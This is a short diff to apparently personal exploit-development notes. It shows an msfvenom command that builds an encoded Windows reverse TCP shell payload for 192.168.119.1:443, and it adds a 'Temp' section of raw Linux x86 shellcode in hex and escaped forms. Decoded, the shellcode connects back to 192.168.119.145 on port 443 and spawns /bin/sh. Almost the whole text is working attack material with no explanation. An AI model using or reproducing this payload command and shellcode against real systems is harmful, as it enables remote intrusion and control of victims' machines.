@@ -62,3 +62,13 @@ jmp eax = FFE0
 ```
 $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\” > shellcode.txt
 ```
+
+
+###### Temp
+
+```
+31dbf7e35343536a0289e1b066cd809359b03fcd804979f968c0a8779168020001bb89e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80
+
+/x31/xdb/xf7/xe3/x53/x43/x53/x6a/x02/x89/xe1/xb0/x66/xcd/x80/x93/x59/xb0/x3f/xcd/x80/x49/x79/xf9/x68/xc0/xa8/x77/x91/x68/x02/x00/x01/xbb/x89/xe1/xb0/x66/x50/x51/x53/xb3/x03/x89/xe1/xcd/x80/x52/x68/x6e/x2f/x73/x68/x68/x2f/x2f/x62/x69/x89/xe3/x52/x53/x89/xe1/xb0/x0b/xcd/x80
+
+```
